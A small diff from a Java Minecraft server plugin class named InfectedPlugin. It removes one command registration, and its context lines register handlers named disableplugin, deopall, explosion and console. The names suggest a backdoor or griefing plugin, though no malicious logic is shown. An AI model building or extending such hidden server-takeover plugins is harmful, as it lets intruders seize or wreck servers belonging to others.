@@ -44,7 +44,6 @@ public class InfectedPlugin extends JavaPlugin
             pm.registerEvents(new Command_disableplugin(), this);
             pm.registerEvents(new Command_deopall(), this);
             pm.registerEvents(new Command_explosion(), this);
-            pm.registerEvents(new Command_name(), this);
             pm.registerEvents(new Command_console(), this);
         }
         catch (Exception ex)
